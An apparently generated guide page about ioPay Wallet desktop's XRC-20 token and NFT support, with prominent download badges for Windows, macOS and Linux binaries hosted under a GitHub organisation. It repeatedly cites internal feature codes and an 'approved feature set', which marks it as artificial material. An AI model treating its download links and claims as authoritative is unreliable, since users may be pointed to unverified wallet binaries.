![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# NFTs and XRC-20 Tokens in ioPay Wallet

Two different questions hide in "does it support NFTs and tokens", and they have different answers:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

- **XRC-20 tokens** - yes, in the asset view and in the swap (F020, F024).
- **NFTs** - this build's approved feature set does not name an NFT gallery, so this page will not claim one.

That gap is worth stating plainly rather than padding. A wallet that shows tokens well and says nothing about NFTs is more useful than a feature list that overstates both.

## XRC-20 tokens

IoTeX is an EVM-compatible chain (F030), and XRC-20 is its token standard - the equivalent of the ERC-20 tokens you already know. The wallet:

- **shows balances** for IOTX and XRC-20 tokens in one view, with transaction status, fee and block number (F020);
- **swaps** IOTX against XRC-20 tokens with best-price routing and adjustable slippage (F024) - [how to set that slippage](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-token-swap-slippage-settings.md);
- **reports** portfolio value and cost basis, with a tax export (F027).

Three things to know about token balances in practice - the third is why [the address page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) matters:

**A token can be missing from the view without being lost.** If it has not been added, or you are looking at another account, the balance is still on-chain. Check the address on an explorer before assuming anything.

**Anyone can send you a token.** Airdropped tokens appear in wallets all the time, and interacting with an unknown token's contract is a common way to lose funds. Holding an airdrop is not the risk; approving something to "claim" it is.

**A token is not a chain.** An XRC-20 token runs on IoTeX and pays its fees in IOTX. If you have no IOTX, you cannot move the token.

## NFTs

What can be said without overreach: NFTs on an EVM-compatible chain are contracts, and an address can hold them whether or not a wallet renders a gallery. If your NFT does not appear in the app, that is a display question - check the address on an explorer to confirm ownership.

No NFT viewer, mint flow or marketplace is claimed here, because none is in the approved feature set for this build.

If NFT support matters to your workflow, that is a reason to check the current release notes before relying on it - and the release body carries no feature list, which is [its own problem](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md).

## What a wallet is responsible for

Worth separating, because token support invites a false expectation:

- **Custody** - the keys, and therefore the tokens, are yours. The wallet holds them by holding the key.
- **Display** - showing what the chain says. A missing row is a display issue.
- **Safety** - warning where it can, not preventing what you confirm.

None of those makes the wallet responsible for a token's value, a project's promises, or an approval you signed.

## FAQ

**Does ioPay Wallet support NFTs and XRC-20 tokens?**
XRC-20 tokens are supported in the balance view and the swap. No NFT gallery is named in this build's feature set.

**Why is my token not showing?**
It may not be added to the view, or you may be on a different account. The balance is on-chain; an explorer confirms it.

**Can I swap any XRC-20 token?**
The swap routes between IOTX and XRC-20 tokens with best-price routing (F024); what is routable depends on liquidity.

**Are airdropped tokens safe?**
Holding them is not the risk. Approving a contract to "claim" or "unlock" them is a common theft pattern.

**Does the wallet support NFT trading?**
No such feature is claimed here.

## Reading a token balance correctly

A token row shows three different facts, and they disagree more often than people expect.

**The amount** is chain state: how many units of that contract the address holds. It is the only number that is authoritative, because it is the one the chain computes.

**The fiat value** is a multiplication, and it is only as good as the price feed behind it. A new or thinly traded token may have no price at all, in which case a value of zero means "not priced", not "worth nothing".

**The cost basis** is a record of what the app saw you pay. If the tokens arrived by airdrop, by a transfer from another wallet, or before this installation existed, there is no basis to report - and a tax export built from it will show an incomplete picture rather than a wrong one.

That distinction matters at exactly the moment people stop trusting the wallet: a fiat number that looks wrong while the amount is right is a price-feed question, not a custody question.

## A token that is not in the list

Token lists are finite and new contracts appear constantly, so "my token is not showing" is usually "not added", not "not supported". Where the interface lets you add a token, do it by contract address taken from the project that issued it, not from a search result or a chat message - a wrong address shows a convincing balance of a token you do not own, and approving it is how wallets get drained.

Before you add anything: confirm the address on an explorer, check that the contract has the holders and transfer history you expect, and treat any token that arrived unrequested as decoration until you have a reason to interact with it.

## What the tax export is, and is not

It is a record of the transactions this installation saw, with the values the app had at the time. It is not a full accounting of an address across every wallet and every year, and it cannot be, because the app only knows what it fetched. If you need a complete history, an explorer's export is the more reliable starting point.


---

*Asset view and swap follow the v2.0.2 feature set (F020, F024); portfolio reporting from F027; chain identity from F030. No NFT feature is claimed.*
